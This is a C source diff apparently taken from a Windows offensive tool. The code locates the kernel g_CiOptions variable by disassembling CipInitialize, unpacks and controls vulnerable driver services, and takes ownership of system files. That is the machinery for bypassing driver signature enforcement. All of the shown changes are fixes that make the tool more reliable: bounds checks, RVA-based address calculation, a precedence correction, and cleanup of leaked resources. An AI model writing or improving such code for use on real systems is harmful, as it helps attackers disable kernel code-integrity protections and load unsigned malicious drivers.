 	BYTE *g_CiOptions = NULL;
-	for(ULONG i = 0; i < 0x4A; i += hs.len)
+	for(ULONG i = 0; i < 0x4A && i + 15 <= dwCipInitAvailable; i += hs.len)
 	{
 		// disassemble code with Hacker Disassembler Engine 64
 		//lint -e{534} Warning 534: Ignoring return value of function
@@ -472,14 +772,14 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 		// check for disassembler error
 		if(hs.flags & F_ERROR)
 		{
-			FreeLibrary(hLib);
+			free(pFile);
 			return 7;
 		}
 
 		// we search for the move instruction "mov cs:g_CiOptions, ecx" with a length of 6 bytes for free retail builds
 		// or the move instruction "mov cs:g_CiOptions, eax" with a length of 6 bytes for checked debug builds
 		//lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
-		if(hs.len == 6 && (CipInitialize[i] == 0x89 && CipInitialize[i + 1] == 0x0D) || (CipInitialize[i] == 0x89 && CipInitialize[i + 1] == 0x05))
+		if(hs.len == 6 && ((CipInitialize[i] == 0x89 && CipInitialize[i + 1] == 0x0D) || (CipInitialize[i] == 0x89 && CipInitialize[i + 1] == 0x05)))
 		{
 			// If we get here, we found the instruction, which sets g_CiOptions variable.
 			// The address of g_CiOptions is directly after the instruction bytes 89 0D for free retail builds or 89 05 for checked debug builds.
@@ -526,6 +826,26 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 			g_CiOptionsOffset = *(LONG*)((BYTE*)CipInitialize + i + 2);
 			// calculate virtual address of g_CiOptions
 			g_CiOptions = (CipInitialize + i + 6 + g_CiOptionsOffset);
+			// track its RVA
+			g_CiOptionsRva = cipInitRva + i + 6 + (DWORD)g_CiOptionsOffset;
+			LONGLONG llg_CiOptionsRva = (LONGLONG)cipInitRva + (LONGLONG)i + 6 + (LONGLONG)g_CiOptionsOffset;
+			if(llg_CiOptionsRva < 0 || (ULONGLONG)llg_CiOptionsRva > 0xFFFFFFFFULL)
+			{
+				free(pFile);
+				return 8;
+			}
+			g_CiOptionsRva = (DWORD)llg_CiOptionsRva;
+			g_CiOptions = MyRvaToPtr(pFile,dwFileSize,g_CiOptionsRva);
+			if(g_CiOptions == NULL)
+			{
+				free(pFile);
+				return 8;
+			}
+			if((ULONG_PTR)g_CiOptions < (ULONG_PTR)pFile || (ULONG_PTR)g_CiOptions - (ULONG_PTR)pFile >= dwFileSize)
+			{
+				free(pFile);
+				return 8;
+			}
 			// leave the for loop
 			break;
 		}
@@ -534,15 +854,15 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 	// check if we have found the offset and virtual address of g_CiOptions
 	if(g_CiOptionsOffset == 0 || g_CiOptions == 0)
 	{
-		FreeLibrary(hLib);
+		free(pFile);
 		return 8;
 	}
 
 	// calculate kernel address of g_CiOptions
-	*ui64Kernelg_CiOptions = ui64ImageBase + (UINT64)g_CiOptions - (UINT64)hLib;
+	*ui64Kernelg_CiOptions = ui64ImageBase + g_CiOptionsRva;
 
-	// free library
-	FreeLibrary(hLib);
+	// free file buffer
+	free(pFile);
 
 	return 0;
 }
@@ -740,6 +1060,7 @@ int MyTakeOwnershipAndAddAdminsToACL(char *szFile)
 	ULONG cCountOfExplicitEntries = 1;
 	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
 	PSID pSIDAdmins = NULL;
+	PACL pOldDACL = NULL;
 
 	// zero memory of explicit access entries
 	ZeroMemory(ea,cCountOfExplicitEntries * sizeof(EXPLICIT_ACCESS));
@@ -761,7 +1082,10 @@ int MyTakeOwnershipAndAddAdminsToACL(char *szFile)
 	ea[0].Trustee.ptstrName = (LPTSTR)pSIDAdmins;
 
 	// get DACL security info from file
+#if 0
 	PACL pOldDACL = NULL;
+#endif
+	pOldDACL = NULL;
 	if(GetNamedSecurityInfo(szFile,SE_FILE_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,&pOldDACL,NULL,NULL) != ERROR_SUCCESS)
 	{
 		rc = 2;
@@ -793,6 +1117,8 @@ int MyTakeOwnershipAndAddAdminsToACL(char *szFile)
 cleanup:
 	// free SID
 	if(pSIDAdmins != NULL) FreeSid(pSIDAdmins);
+	// free DACL returned by GetNamedSecurityInfo
+	if(pOldDACL != NULL) LocalFree(pOldDACL);
 
 	return rc;
 }
@@ -877,6 +1203,13 @@ int MyUnpackVulnerableDriver(DRIVER_FILE *df,DWORD dwElements)
 			break;
 		}
 
+		// if the file already exists, skip writing it (do not overwrite), but
+		// keep checking the remaining files so a partially unpacked set gets completed
+		if(PathFileExists(df->szFilePath) == TRUE)
+		{
+			df++;
+			continue;
+		}
 		// check if the driver file already exists
 		if(PathFileExists(df->szFilePath) == TRUE)
 		{
@@ -1050,7 +1383,7 @@ int MyStopAndDeleteService(VULNERABLE_DRIVER *vd)
 		}
 
 		// stop service
-		if(ControlService(schService,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&ssp) == FALSE)
+		if(ssp.dwCurrentState != SERVICE_STOPPED && ControlService(schService,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&ssp) == FALSE)
 		{
 			rc = 4;
 			goto cleanup;
@@ -1637,7 +1970,7 @@ DWORD WINAPI MyThreadProc1(PVOID pvoid)
 	// Attention: We do not use GetVersion or GetVersionEx API, because with the
 	// release of Windows 8.1 the value returned by the GetVersion and GetVersionEx
 	// function now depends on how the application is manifested.
-	OSVERSIONINFO osvi;
+	RTL_OSVERSIONINFOW osvi;
 	if(MyRtlGetVersion(&osvi) != 0)
 	{
 		MessageBox(g.Dlg1.hDialog1,"Can't retrieve operating system version!","Error",16);
